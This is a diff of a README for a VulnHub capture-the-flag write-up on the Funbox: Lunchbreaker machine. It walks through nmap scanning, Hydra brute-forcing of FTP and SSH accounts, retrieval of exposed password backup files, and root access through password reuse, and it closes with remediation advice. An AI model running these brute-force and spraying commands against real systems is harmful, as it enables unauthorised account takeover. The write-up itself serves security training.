@@ -2,110 +2,478 @@
 
 ## Overview
 
-**Funbox: Lunchbreaker** is an easy-level VulnHub machine that focuses on FTP security assessment, user enumeration, credential attacks, password spraying, SSH access, local enumeration, and privilege escalation through password reuse.
+**Funbox: Lunchbreaker** is an Easy-level VulnHub machine that demonstrates the dangers of weak credential management, anonymous FTP access, password brute-forcing, exposed backup files, password spraying, and password reuse. The machine showcases how multiple low-risk misconfigurations can be chained together to gain complete system compromise.
 
-The challenge demonstrates how poor credential management, weak passwords, and exposed backup files can lead to complete system compromise.
+This lab provides practical experience in reconnaissance, FTP enumeration, web enumeration, Hydra password attacks, SSH password spraying, Linux enumeration, and privilege escalation through root password reuse.
+
+---
 
 ## Machine Information
 
-| Attribute   | Value                                               |
-| ----------- | --------------------------------------------------- |
-| Platform    | VulnHub                                             |
-| Machine     | Funbox: Lunchbreaker                                |
-| Author      | 0815R2d2                                            |
-| Series      | Funbox                                              |
-| Difficulty  | Easy                                                |
-| Target OS   | Ubuntu Linux                                        |
-| Attacker OS | Kali Linux                                          |
-| Objective   | Gain Initial Access and Escalate Privileges to Root |
+| Attribute | Value |
+|------------|---------|
+| Machine Name | Funbox: Lunchbreaker |
+| Platform | VulnHub |
+| Difficulty | Easy |
+| Target OS | Ubuntu Linux |
+| Attacker Machine | Kali Linux |
+| Main Vector | Anonymous FTP → Weak Credentials → Backup Password Files → SSH Password Spraying → Root Password Reuse |
+| Objective | Gain Root Access and Retrieve the Root Flag |
+
+---
 
 ## Skills Demonstrated
 
-* Network Discovery
-* Service Enumeration
-* Nmap Scanning
-* FTP Security Assessment
-* Anonymous FTP Enumeration
-* User Enumeration
-* Password Auditing
-* Credential Discovery
-* Hydra Password Attacks
-* Password Spraying
-* SSH Authentication Testing
-* Linux Enumeration
-* Privilege Escalation
-* Security Misconfiguration Assessment
-* Post-Exploitation
+- Network Discovery
+- Host Enumeration
+- Service Enumeration
+- Nmap Scanning
+- FTP Enumeration
+- Anonymous FTP Access
+- Web Enumeration
+- Source Code Inspection
+- Username Enumeration
+- Password Brute Force
+- Hydra
+- Password Spraying
+- SSH Enumeration
+- Linux Enumeration
+- Credential Harvesting
+- Privilege Escalation
+- Post Exploitation
+
+---
 
 ## Tools Used
 
-* Netdiscover
-* Nmap
-* Hydra
-* FTP Client
-* SSH
-* Linux Enumeration Commands
-* Kali Linux
+- Netdiscover
+- Nmap
+- Hydra
+- FTP
+- SSH
+- Linux Commands
+- Kali Linux
+
+---
 
 ## Attack Methodology
 
-1. Discover the target host on the network.
-2. Enumerate open ports and running services.
-3. Assess FTP security configuration.
-4. Identify valid usernames through information disclosure.
-5. Perform credential security testing.
-6. Gain authenticated access to multiple FTP accounts.
-7. Discover sensitive backup files and credential information.
-8. Conduct password spraying against SSH services.
-9. Obtain authenticated SSH access.
-10. Perform local system enumeration.
-11. Identify password reuse issues.
-12. Escalate privileges to root.
-13. Validate compromise and retrieve proof.
+1. Discover the target machine.
+2. Enumerate open services.
+3. Identify anonymous FTP access.
+4. Enumerate usernames from the web page source.
+5. Brute-force multiple FTP accounts.
+6. Enumerate user home directories.
+7. Access exposed password backup files.
+8. Perform SSH password spraying.
+9. Obtain SSH access.
+10. Enumerate local files.
+11. Discover root password reuse.
+12. Escalate privileges.
+13. Retrieve the root flag.
 
-## Key Learning Outcomes
+---
 
-* Weak passwords significantly increase attack success rates.
-* Anonymous FTP services can expose sensitive information.
-* Password spraying remains an effective attack technique against reused credentials.
-* Backup files frequently contain valuable reconnaissance data.
-* Credential reuse creates critical privilege escalation risks.
-* Proper access control and credential hygiene are essential security practices.
-* Enumeration is often the most important phase of a penetration test.
+## Network Discovery
+
+Identify the target machine.
+
+```bash
+sudo netdiscover -i eth0
+```
+
+Result:
+
+```text
+192.168.10.22
+```
+
+The vulnerable machine was successfully identified on the local network.
+
+---
+
+## Service Enumeration
+
+Run an Nmap scan.
+
+```bash
+sudo nmap -sC -sV -Pn 192.168.10.22 --min-rate 10000
+```
+
+### Open Ports
+
+| Port | Service | Version |
+|------|----------|---------|
+| 21 | FTP | vsftpd 3.0.3 |
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Apache 2.4.41 |
+
+### Important Findings
+
+- Anonymous FTP enabled
+- SSH service available
+- Apache web server running
+
+---
+
+## Web Enumeration
+
+Visit the website and inspect the page source.
+
+Discovered username:
+
+```text
+jane
+```
+
+This provided a valid username for further enumeration.
+
+---
+
+## Brute-Forcing FTP Credentials (Jane)
+
+Use Hydra.
+
+```bash
+hydra -l jane -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
+```
+
+Recovered credentials:
+
+```text
+Username: jane
+Password: password
+```
+
+---
+
+## FTP Enumeration (Jane)
+
+Login using Jane's credentials.
+
+```bash
+ftp 192.168.10.22
+```
+
+Enumerate directories.
+
+```bash
+dir
+cd /home
+dir
+```
+
+Discovered users:
+
+```text
+jane
+jim
+john
+jules
+```
+
+---
+
+## Brute-Forcing FTP Credentials (Jim)
+
+```bash
+hydra -l jim -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
+```
+
+Recovered credentials:
+
+```text
+Username: jim
+Password: 12345
+```
+
+---
+
+## FTP Enumeration (Jim)
+
+Login.
+
+```bash
+ftp 192.168.10.22
+```
+
+Inspect files.
+
+```bash
+ls -la
+cd .ssh
+ls -la
+```
+
+Interesting files:
+
+```text
+authorized_keys
+id_rsa
+```
+
+Both files were empty.
+
+---
+
+## Brute-Forcing FTP Credentials (Jules)
+
+```bash
+hydra -l jules -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
+```
+
+Recovered credentials:
+
+```text
+Username: jules
+Password: sexylady
+```
+
+---
+
+## FTP Enumeration (Jules)
+
+Login.
+
+```bash
+ftp 192.168.10.22
+```
+
+Navigate to the backup directory.
+
+```bash
+ls -la
+cd .backups
+ls -la
+```
+
+Interesting files:
+
+```text
+.bad-passwds
+.good-passwd
+.forbidden-passwds
+.very-bad-passwds
+```
+
+Download useful password lists.
+
+```bash
+get .bad-passwds
+get .good-passwd
+```
+
+---
+
+## SSH Password Spraying
+
+First attempt using the good password list.
+
+```bash
+hydra -l john -P .good-passwd ssh://192.168.10.22
+```
+
+No valid credentials were found.
+
+Try again using the bad password list.
+
+```bash
+hydra -l john -P .bad-passwds ssh://192.168.10.22
+```
+
+Recovered credentials:
+
+```text
+Username: john
+Password: zhnmju!!!
+```
+
+---
+
+## Initial Access
+
+Login via SSH.
+
+```bash
+ssh john@192.168.10.22
+```
+
+Verify access.
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+john
+```
+
+---
+
+## Local Enumeration
+
+Inspect the user's home directory.
+
+```bash
+ls -la
+```
+
+Interesting directory:
+
+```text
+.todo
+```
+
+Read the task list.
+
+```bash
+cd .todo
+cat todo.list
+```
+
+Contents:
+
+```text
+1. Install LAMP
+2. Install MAIL-System
+3. Install Firewall
+4. Install Plesk
+5. Change ROOTPASSWD, because it's the same right now.
+```
+
+This reveals that the root password is identical to John's password.
+
+---
+
+## Privilege Escalation
+
+Switch to the root account.
+
+```bash
+su root
+```
+
+Password:
+
+```text
+zhnmju!!!
+```
+
+Verify.
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Root privileges successfully obtained.
+
+---
+
+## Root Flag
+
+Navigate to the root directory.
+
+```bash
+cd /root
+```
+
+Read the flag.
+
+```bash
+cat root.flag
+```
+
+Root flag successfully captured.
+
+---
 
 ## Vulnerabilities Identified
 
-* Anonymous FTP Access Enabled
-* Weak FTP Passwords
-* User Enumeration Exposure
-* Sensitive Backup Files Exposed
-* Password Spraying Susceptibility
-* Password Reuse
-* Poor Credential Management
-* Privilege Escalation via Shared Credentials
+### 1. Anonymous FTP Enabled
+
+Anonymous authentication exposed the FTP service.
+
+### 2. Weak FTP Passwords
+
+Multiple user accounts used easily guessable passwords.
+
+### 3. Username Enumeration
+
+Valid usernames were disclosed through the website source and FTP directory structure.
+
+### 4. Exposed Backup Password Files
+
+Sensitive password lists were accessible through FTP.
+
+### 5. Password Spraying
+
+SSH credentials were successfully obtained using exposed password files.
+
+### 6. Root Password Reuse
+
+The root account reused the same password as a standard user, allowing immediate privilege escalation.
+
+---
+
+## Attack Chain Summary
+
+- Network Discovery using Netdiscover
+- Service Enumeration using Nmap
+- Anonymous FTP Access
+- Username Enumeration
+- FTP Password Brute Force
+- Multiple FTP Account Enumeration
+- Backup Password File Discovery
+- SSH Password Spraying
+- SSH Access as John
+- Local Enumeration
+- Root Password Reuse Discovery
+- Privilege Escalation
+- Root Flag Retrieval
+
+---
 
 ## Security Recommendations
 
-* Disable anonymous FTP access where unnecessary.
-* Enforce strong password policies.
-* Prevent password reuse across accounts.
-* Protect backup files and sensitive information.
-* Implement multi-factor authentication (MFA).
-* Restrict access to sensitive directories.
-* Monitor authentication attempts and account activity.
-* Conduct regular security audits and credential reviews.
+- Disable anonymous FTP access.
+- Enforce strong password policies.
+- Prevent password reuse across accounts.
+- Remove exposed backup password files.
+- Restrict directory permissions.
+- Enable account lockout after repeated authentication failures.
+- Implement MFA for SSH access.
+- Regularly audit credentials and permissions.
+- Monitor authentication logs for brute-force attacks.
+- Apply the principle of least privilege.
 
-## Walkthrough
+---
 
-📄 Detailed Proof of Concept (PoC) report available in:
+## Key Learning Outcomes
 
-**Funbox_Lunchbreaker_Walkthrough.pdf**
+- Anonymous FTP services expose valuable attack surfaces.
+- Source code inspection can reveal valid usernames.
+- Weak passwords remain a major security risk.
+- Password backup files should never be publicly accessible.
+- Password spraying is effective when password reuse exists.
+- Local enumeration often uncovers privilege escalation opportunities.
+- Root password reuse can completely compromise a system.
 
-## Disclaimer
+---
 
-This walkthrough was completed in a controlled lab environment using an intentionally vulnerable machine provided by VulnHub. The content is intended solely for educational purposes, cybersecurity training, and ethical hacking practice.
+## Conclusion
+
+Funbox: Lunchbreaker is an excellent beginner-friendly VulnHub machine that demonstrates how poor credential management can lead to complete system compromise. The machine combines FTP enumeration, password brute-forcing, credential harvesting, SSH password spraying, Linux enumeration, and privilege escalation, reinforcing the importance of secure password policies, access control, and credential management.
 
 ---
 
 **Author:** Omkar Babaji Sawant
+
 **Repository:** VulnHub-Walkthroughs
